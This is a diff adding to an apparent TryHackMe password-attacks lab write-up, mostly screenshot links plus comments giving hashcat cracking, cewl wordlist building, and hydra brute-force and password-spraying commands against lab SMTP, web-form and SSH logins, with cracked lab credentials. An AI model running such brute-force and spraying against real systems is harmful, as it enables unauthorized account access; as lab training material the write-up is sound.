@@ -47,6 +47,52 @@ This room introduces the fundamental techniques to perform a successful password
 # For Q2: use hashcat -a 0 -m 100 8d6e34f987851aa599257d3831a1af040886842f rockyou.txt (path to rockyou.txt, /usr/share/wordlists/rockyou.txt usually in kali)
 # For Q3: use hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d
 
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/045e2497-46d1-437c-ba51-ab7fe6226550)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/c5d1236f-be35-4dc3-9a4b-fdaa5caeaeaa)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/92035237-7370-4e89-9b97-e57e6bb3d39c)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/0a56e63f-72a7-4494-8732-00d3eb86fda5)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/8b8b8457-bb3e-46ea-b426-d7e8d084fadd)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/2ad78ee3-5f6a-4941-b882-c307c4a7c678)
+
+# The answer is pretty self-explanatory.
+
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/f3830d70-8a95-4657-bcb7-64495787c4b8)
+
+# Generate the custom wordlist - cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/ 
+
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/7dadd682-d360-46f1-8613-86c165aad8b1)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/1416504e-8974-4ab7-b435-522442b1682e)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/9c9fc25f-102d-4d7d-b226-af9d07497f4b)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/a2fce774-f9e9-47cc-8f76-625d8e0243eb)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/f66f3cfe-b213-49a6-b83a-728aebf0d1b6)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/ab9f3f4c-250b-4bc9-8ee3-d83e2b21a790)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/d33a75b1-0e30-478f-8da3-c0992277ae32)
+
+# For Q1 Task 8: Sometimes, FTP allows anonymous login. ftp 10.10.130.195 (in this case)can be used to login. Get the flag /files/flag.txt
+# For Q2, use hydra -l pittman@clinic.thmredteam.com -P passwords.lst smtps://10.10.130.195 (passwords.lst from previous task)
+# For Q3, use hydra -l phillips -P clinic.lst 10.10.130.195 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" (previously generated clinic.lst)
+# For Q4, first generate new list of passwords using: john --wordlist=clinic.lst --rules=Single-Extra > new_passwords.lst and then use hydra
+# hydra -l burgess -P new_passwords.lst 10.10.130.195 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php"
+# Note - once you find the passwords, login using the credentials to get the flags.
+
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/f8e40310-d91d-4be4-9431-f12f22599943)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/c13977d1-a304-4a25-8e51-f6b84e7952db)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/ec2e519d-6834-4067-9ea1-a5b769cbe845)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/5aec555e-dc20-4124-b3c3-d816809317eb)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/34cb6cbc-a1f3-4ec9-b25d-38db4e4d056b)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/e8ea180a-279e-4ba1-97be-eb1753ed626c)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/8aa41a19-a232-4023-b5c2-e023257b308e)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/9db29479-8edc-4754-802a-bb7bf9e7e03b)
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/e50252b1-c87c-4382-ab19-d7eb71a3ebb5)
+
+# For this task, first save the given usernames in a file, say usernames.lst and from the hint try to guess a password and feed it to hydra.
+# hydra -L usernames.lst -p Fall2021@ ssh://10.10.130.195, returned username= burgess and password=Fall2021@
+
+![image](https://github.com/benichi2022/securewriteup-tryhackme/assets/113864743/efbbb783-96b0-4f45-baa3-5d59fda5b678)
+
+It has been an interesting room and very informative on how to gain a foothold in system by manipulating credentials.
+Credits: https://tryhackme.com/p/tryhackme
+
 
 
 
